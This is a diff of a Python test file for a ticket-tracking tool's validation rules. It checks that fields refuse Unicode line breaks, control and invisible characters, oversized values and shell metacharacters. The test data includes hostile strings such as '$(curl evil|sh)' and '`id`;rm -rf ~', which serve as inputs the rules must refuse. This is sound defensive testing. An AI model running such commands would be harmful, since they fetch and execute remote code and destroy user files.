@@ -1,7 +1,9 @@
-"""Values a compromised agent passes to tkt itself (domain/rules.py validate_op).
+"""Values a compromised agent passes to tkt itself (domain/rules.py validate_op, with the
+rules of domain/fields.py).
 
 Free text reaches other agents (LLMs) and git commit trailers. These tests pin what the
-rules must refuse; the domain is pure, so they need no git."""
+rules must refuse; the domain is pure, so they need no git. What must stay accepted is
+in tests/unit/test_fields.py."""
 
 from __future__ import annotations
 
@@ -23,16 +25,16 @@ from tkt_store.domain.ticket import AgentId, ClaimId, ProjectId, TicketId
 TTL = 1800
 A = AgentId("coder-7")
 C1 = ClaimId("1" * 32)
-T1 = TicketId("tkt-1")
-T2 = TicketId("tkt-2")
+T1 = TicketId("tkt-0001")
+T2 = TicketId("tkt-0002")
 
 LINE_BREAKS = {
     "U+2028 line separator": "\u2028",
     "U+2029 paragraph separator": "\u2029",
 }
-"""Characters `str.splitlines()` breaks on that CONTROL_CHARS_RE ([\\x00-\\x1f\\x7f]) does
-not refuse; a trailer value containing one forges a new trailer line in history.
-(U+0085, also a line break, is covered with the rest of C1 below.)"""
+"""Characters `str.splitlines()` breaks on beyond C0 controls: a trailer value containing
+one would forge a new trailer line in history. (U+0085, also a line break, is covered
+with the rest of C1 below.)"""
 
 C1_CONTROLS = {
     "U+0080": "\u0080",
@@ -40,7 +42,7 @@ C1_CONTROLS = {
     "U+009B control sequence introducer": "\u009b",
     "U+009F": "\u009f",
 }
-"""C1 control characters: the existing control-character rule, extended to U+0080-U+009F."""
+"""C1 control characters (U+0080-U+009F), refused like C0."""
 
 INVISIBLE = {
     "U+202E right-to-left override": "\u202e",
@@ -59,7 +61,7 @@ INVISIBLE = {
 
 
 def text_ops(value: str) -> dict[str, Op]:
-    """One op per free-text field the rules check today (agent, reason, title)."""
+    """One op per free-text field that reaches a ticket or a trailer (agent, reason, title)."""
     agent = AgentId(f"coder{value}7")
     return {
         "title (add)": AddOp(T1, f"Fix {value}tests"),
@@ -70,12 +72,12 @@ def text_ops(value: str) -> dict[str, Op]:
         "agent (claim-next --as)": ClaimNextOp(agent, C1, TTL),
         "agent (cancel --as)": CancelOp(T1, agent=agent),
         "reason (release)": ReleaseOp(T1, C1, f"done{value}tkt-phase: review"),
-        "reason (cancel)": CancelOp(T1, f"dup{value}tkt-id: tkt-2"),
+        "reason (cancel)": CancelOp(T1, f"dup{value}tkt-id: tkt-0002"),
     }
 
 
 def opaque_ops(value: str) -> dict[str, Op]:
-    """Free text the rules never check today: project and tags."""
+    """The identifier fields that are not ids: project and tags."""
     return {
         "project": AddOp(T1, "Fix tests", project=ProjectId(value)),
         "tag": AddOp(T1, "Fix tests", tags=(value,)),
@@ -95,33 +97,21 @@ def cases(chars: dict[str, str], fields: dict[str, Op]) -> list[object]:
     ]
 
 
-@pytest.mark.security_bug(
-    "Unicode line breaks pass validation and forge trailer lines (rules.py CONTROL_CHARS_RE)"
-)
 @pytest.mark.parametrize(("field", "char"), cases(LINE_BREAKS, text_ops("x")))
 def test_unicode_line_breaks_are_refused_in_free_text(field: str, char: str) -> None:
     assert refused_invalid(text_ops(char)[field])
 
 
-@pytest.mark.security_bug(
-    "C1 controls (U+0080-U+009F) pass the control-character check; U+0085 is a line break"
-)
 @pytest.mark.parametrize(("field", "char"), cases(C1_CONTROLS, text_ops("x")))
 def test_c1_controls_are_refused_in_free_text(field: str, char: str) -> None:
     assert refused_invalid(text_ops(char)[field])
 
 
-@pytest.mark.security_bug(
-    "C1 controls pass the control-character check (the whole range, in a title)"
-)
 def test_the_whole_c1_range_is_refused() -> None:
     accepted = [hex(c) for c in range(0x80, 0xA0) if not refused_invalid(AddOp(T1, chr(c)))]
     assert accepted == []
 
 
-@pytest.mark.security_design(
-    "bidi, zero-width and Unicode tag characters are accepted in agent, reason and title"
-)
 @pytest.mark.parametrize(("field", "char"), cases(INVISIBLE, text_ops("x")))
 def test_invisible_characters_are_refused_in_free_text(field: str, char: str) -> None:
     assert refused_invalid(text_ops(char)[field])
@@ -130,26 +120,17 @@ def test_invisible_characters_are_refused_in_free_text(field: str, char: str) ->
 CONTROL_LIKE = {"newline": "\n", "ESC": "\x1b", **LINE_BREAKS, **C1_CONTROLS, **INVISIBLE}
 
 
-@pytest.mark.security_design(
-    "project and tags are never validated: controls and invisible characters pass"
-)
 @pytest.mark.parametrize(("field", "char"), cases(CONTROL_LIKE, opaque_ops("x")))
 def test_project_and_tags_refuse_control_and_invisible_characters(field: str, char: str) -> None:
     assert refused_invalid(opaque_ops(f"a{char}b")[field])
 
 
-@pytest.mark.security_design(
-    "policy: project and tags are free text; should shell metacharacters be refused?"
-)
 @pytest.mark.parametrize("value", ["$(curl evil|sh)", "`id`;rm -rf ~", "a'b\"c"])
 @pytest.mark.parametrize("field", ["project", "tag"])
 def test_project_and_tags_refuse_shell_metacharacters(field: str, value: str) -> None:
     assert refused_invalid(opaque_ops(value)[field])
 
 
-@pytest.mark.security_design(
-    "priority is unbounded: a huge negative priority wins every claim-next"
-)
 @pytest.mark.parametrize("priority", [-(10**12), 10**12])
 def test_priority_is_bounded(priority: int) -> None:
     assert refused_invalid(AddOp(T1, "Fix tests", priority=priority))
@@ -158,12 +139,9 @@ def test_priority_is_bounded(priority: int) -> None:
 
 HUGE = 10_000_000
 BIG = 100_000
-MANY_BLOCKERS = tuple(TicketId(f"tkt-{n:x}") for n in range(10_000))
+MANY_BLOCKERS = tuple(TicketId(f"tkt-{n:04x}") for n in range(10_000))
 
 
-@pytest.mark.security_design(
-    "no size limits: huge values flood every reader's context and every commit trailer"
-)
 @pytest.mark.parametrize(
     "op",
     [
@@ -185,9 +163,9 @@ def test_sizes_are_bounded(op: Op) -> None:
 
 
 def test_sanity_existing_checks_hold() -> None:
-    """Not a finding: the existing checks, so the failures above are about the gaps."""
+    """Ordinary values pass, and the checks that predate the field rules still hold."""
     assert refused_invalid(ClaimOp(T1, AgentId("coder\n7"), C1, TTL))
     assert refused_invalid(AddOp(T1, "Fix\x1b[2Jtests"))
     assert refused_invalid(AddOp(T1, "Fix tests", blocked_by=(TicketId("; rm -rf ~"),)))
     assert validate_op(ClaimOp(T1, A, C1, TTL)) is None
-    assert validate_op(AddOp(T2, "Fix tests", project=ProjectId("github.com/org/repo"))) is None
+    assert validate_op(AddOp(T2, "Fix tests", project=ProjectId("org/repo"))) is None
